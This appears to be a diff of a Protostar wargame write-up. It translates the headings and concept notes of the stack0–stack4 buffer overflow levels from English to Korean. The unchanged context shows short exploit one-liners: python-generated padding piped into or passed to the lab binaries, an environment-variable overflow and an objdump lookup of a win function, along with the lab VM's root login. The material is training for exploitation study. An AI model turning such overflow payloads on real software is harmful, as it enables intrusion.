@@ -1,7 +1,7 @@
-### Install
+### 설치 방법
 
-> protostar vm on parallels
-> root/godmod and ifconfig
+> * protostar vm on parallels
+> * root/godmod and ifconfig
 
 ### Stack0
 
@@ -28,7 +28,7 @@ int main(int argc, char **argv)
 }
 ```
 
-The concepts I need to know : `parameter passing to gets()`, `order of local parameters on the stack`, `command line python script` 
+알아야하는 것 : *parameter passing to gets()*, *order of local parameters on the stack*, *command line python script* 
 
 ```
 $ (python -c 'print "A"*64+"BBBB"';cat)|./stack0
@@ -65,7 +65,7 @@ int main(int argc, char **argv)
 }
 ```
 
-The concepts I need to know : `endian in memory`
+알아야하는 것 : *endian in memory*
 
 ```
 $ ./stack1 `python -c 'print "A"*64+"\x64\x63\x62\x61"'`
@@ -107,7 +107,7 @@ int main(int argc, char **argv)
 }
 ```
 
-The concepts I need to know : `shell variable`, `env variable`
+알아야하는 것 : *shell variable*, *env variable*
 
 ```
 $ GREENIE=`python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"'`
@@ -147,7 +147,7 @@ int main(int argc, char **argv)
 }
 ```
 
-The concepts I need to know : `getting address of the function`, `objdump`
+알아야하는 것 : *getting address of the function*, *objdump*
 
 ```
 $ objdump -d ./stack3 | grep win
@@ -180,7 +180,7 @@ int main(int argc, char **argv)
 }
 ```
 
-The concepts I need to know : `gdb`, `make eip value modified`, `assembly lea    0x10(%esp),%eax`
+알아야하는 것 : *gdb*, *make eip value modified*, *assembly lea    0x10(%esp),%eax*
 
 ```
 $ scp user@10.211.55.5:/opt/protostar/bin/stack4 .
